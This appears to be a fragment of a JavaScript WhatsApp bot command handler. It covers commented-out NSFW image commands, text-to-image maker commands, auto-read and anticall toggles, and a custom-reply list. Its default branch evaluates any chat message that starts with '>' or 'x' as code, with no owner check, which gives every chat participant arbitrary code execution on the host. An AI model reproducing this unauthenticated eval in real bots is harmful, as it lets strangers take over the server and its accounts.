              zero.relayWAMessage(prep)
break
case 'bj':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
yoiz = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=bJ&apikey=${hardi}`)
buttons = [{buttonId: `bj`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(yoiz, "imageMessage", { thumbnail: yoiz, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              zero.relayWAMessage(prep)
break
case 'kitsune':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=kitsune&apikey=${hardi}`)
buttons = [{buttonId: `kitsune`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'pussy':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=pussy&apikey=${hardi}`)
buttons = [{buttonId: `pussy`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'wallpaper':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=wallpaper&apikey=${hardi}`)
buttons = [{buttonId: `wallpaper`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'neko2':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=neko&apikey=${hardi}`)
buttons = [{buttonId: `neko2`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'baka':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=baka&apikey=${hardi}`)
buttons = [{buttonId: `baka`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'slap':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=slap&apikey=${hardi}`)
buttons = [{buttonId: `slap`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'poke':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?sfw=poke&apikey=${hardi}`)
buttons = [{buttonId: `poke`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case 'keta':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
hai = await getBuffer(`https://hardianto-chan.herokuapp.com/api/anime/random?nsfw=keta&apikey=${hardi}`)
buttons = [{buttonId: `keta`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await zero.prepareMessageMedia(hai, "imageMessage", { thumbnail: hai, })).imageMessage
              buttonsMessage = {footerText:'BTR BOT', imageMessage: imageMsg,
              contentText:`ɴᴏᴛᴇ: ʜᴏʀɴʏ = ʙᴏɴᴋs`,buttons,headerType:4}
              prep = await zero.prepareMessageFromContent(from,{buttonsMessage},{quoted: fvn})
              zero.relayWAMessage(prep)
break
case  'awoo':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/awoo`)
buffer = await getBuffer(anu.url)
zero.sendMessage(from, buffer, image, { quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'blowjob':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
buffer = await getBuffer(anu.url)
zero.sendMessage(from, buffer, image, { quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'hentai': 
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
zero.sendMessage(from, buffer, image, { quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'megumin':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/megumin`)
buffer = await getBuffer(anu.url)
zero.sendMessage(from, buffer, image, { quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'neko':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/neko`)
buffer = await getBuffer(anu.url)
zero.sendMessage(from, buffer, image, { quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case  'trapnime':
if (!isGroup) return reply('this feature is only for groups')
if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/trap`)
buffer = await getBuffer(anu.url)
zero.sendMessage(from, buffer, image, { quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case 'nsfw':
	        if (!isGroup) return reply('this feature is only for groups')
			if (!isOwner && !isGroupAdmins) return reply('only admin can use this feature')
					if (args.length < 1) return reply(`to activate type : ${prefix}nsfw 1`)
					if (Number(args[0]) === 1) {
						if (isNsfw) return reply('Already Activated')
						nsfww.push(from)
						fs.writeFileSync('./mess/nsfww.json', JSON.stringify(nsfww))
						reply('Successfully activated the nsfw feature')
						zero.sendMessage(from, `Free to Find Hentai 🗿`, text)
					} else if (Number(args[0]) === 0) {
						if (!isNsfw) return reply('Its off')
						var ini = nsfww.indexOf(from)
						nsfww.splice(ini, 1)
						fs.writeFileSync('./mess/nsfww.json', JSON.stringify(nsfww))
						reply('Successfully disable the nsfw feature')
					} else {
						reply('1 to turn on, 0 to turn off')
					}
					break*/
case 'maker3d': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Bambang`)
					makell = body.slice(8)
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'maker3d2': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Bambang`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no2?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'maker3d3': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Bambang`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no3?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'maker3d4': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Bambang`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker3d/no4?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'transformer': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Bambang`)
					makell = args.join(" ")
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/maker/special/transformer?text=${makell}&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.results)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'googletxt2':
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} tsukasa|chan|kawai`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					ll3 = makell.split("|")[0];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker?text=${ll1}&text2=${ll2}&text3=${ll3}&theme=google-suggestion&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
			case 'battlefield': 
                    if (args.length < 1) return reply(`*Example :*\n${prefix}${command} Bambang|Doge`)
					makell = args.join(" ")
					ll1 = makell.split("|")[0];
					ll2 = makell.split("|")[1];
					reply(mess.wait)
					anu = await fetchJson(`https://api-xchillds.herokuapp.com/api/textmaker/game?text=${ll1}&text2=${ll2}&theme=battlefield&apikey=${xchillds}`)
					buffer1 = await getBuffer(anu.result.url)
					zero.sendMessage(from, buffer1, image, {quoted: zer, thumbnail: fs.readFileSync('./xeon.jpg')})
					break
case 'anticall':
if (!isOwner && !itsMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if(antical)return reply('It has been activated before!')
antical = true
reply(`Succesfully activated anticall`)
} else if (args[0] === "off") {
if(!antical)return reply('It has been deactivated before!')
antical = false
reply(`Successfully turned off anticall`)
} else {
reply(`Select on or off`)
}
break

case 'autoread':
if (args.length < 1) return reply(`Example:\n${prefix}autoread gc on`)
if (args[0] === "gc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread gc on`)
if (args[1] === "on") {
if (readGc === true) return
readGc = true
reply(`Succesfully activated autoread group`)
} else if (args[1] === "off") {
if (readGc === false) return
readGc = false
reply(`Successfully turned off autoread group`)
} else {
reply(`Select on or off`)
}
} else if (args[0] === "pc") {
if (args.length < 2) return reply(`Example:\n${prefix}autoread pc on`)
if (args[1] === "on") {
if (readPc === true) return
readPc = true
reply(`Succesfully activated autoread pc`)
} else if (args[1] === "off") {
if (readPc === false) return
readPc = false
reply(`Successfully turned off autoread pc`)
} else {
reply(`Select on or off`)
}
} else {
reply(`*List Auto Read*\n•> gc\n•> pc`)
}
break
       case 'autotype':
if (!isOwner && !zer.key.fromMe) return
if (args.length < 1) return reply('Choose on or off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Success activate autotype`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Success turns off autotype`)
} else {
reply(`Choose on or off`)
}
break
case 'autovn':
if (!isOwner && !zer.key.fromMe) return
if (args.length < 1) return reply('Select on or off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succesfully activated autovn`)
} else if (args[0] === "off") {
if (autovn === false) return
autovn = false
reply(`Successfully turned off autovn`)
} else {
reply(`Select on or off`)
}
break
      case "autojoin":
        if (!isGroup) return reply("Group only");
        if (!zer.key.fromMe) return reply("This feature is only for the owner");
        if (args[0] == "on") {
          if (autojoin == true) return reply("Activated!!");
          autojoin = true;
          reply("Successfully activated autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Successfully turned off autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Please choose one`, [
            {
              buttonId: `autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Group only");
        if (!isGroupAdmins && !zer.key.fromMe) return reply("admin only");
        if (args[0] == "on") {
          if (isKickarea) return reply("Activated!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./storage/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Successfully activated kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./storage/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Successfully turned off kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Please choose one`, [
            {
              buttonId: `kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
					case 'addrespond':
			if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
				if (args.length < 1) return reply(`Use ${prefix}addrespond Hi|Hi too`)
				argz = arg.split('|')
				if (checkCommands(argz[0], commandsDB) === true) return reply(`Already there`)
				addCommands(argz[0], argz[1], sender, commandsDB)
				reply(`Successful adding response ${argz[0]}`)
				break
				case 'delrespond':
			if (!isOwner && !zer.key.fromMe) return reply('Only owner can use this feature')
				if (args.length < 1) return reply(`Use ${prefix}delrespond hai`)
				if (!checkCommands(body.slice(11), commandsDB)) return reply(`Not in the database`)
                deleteCommands(body.slice(11), commandsDB)
				reply(`Successfully deleted response ${body.slice(11)}`)
				break
				case 'respondlist':

teks = `\`\`\`「 LIST RESPON  」\`\`\`\n\n`
for (let i = 0; i < commandsDB.length; i ++){
teks += `❏ *Ask:* ${commandsDB[i].pesan}\n`
teks += `❏ *Reply:* ${commandsDB[i].balasan}\n`
teks += `❏ *Creator:* ${commandsDB[i].creator}\n\n`
}
reply(teks)
break
//━━━━━━━━━━━━━━━[ AKHIR FITUR ]━━━━━━━━━━━━━━━━━//
        
default:
if (budy.startsWith('>')) {
console.log(color('[EVAL1]'), color(moment(zer.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval return`))
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
reply(`${evaled}`)
} catch (err) {
reply(`${err}`)
}
} else if (budy.startsWith('x')) {
console.log(color('[EVAL2]'), color(moment(zer.messageTimestamp * 1000).format('DD/MM/YY HH:mm:ss'), 'yellow'), color(`eval identy`))
try {
return zero.sendMessage(from, JSON.stringify(eval(budy.slice(2)), null, '\t'), text, { quoted: ftrol })
} catch (err) {
e = String(err)
reply(e)
}
}
}
} catch (e) {
e = String(e)
if (!e.includes("this.isZero") && !e.includes("jid")) {
console.log('Error : %s', color(e, 'red'))
}
// console.log(e)
}
}
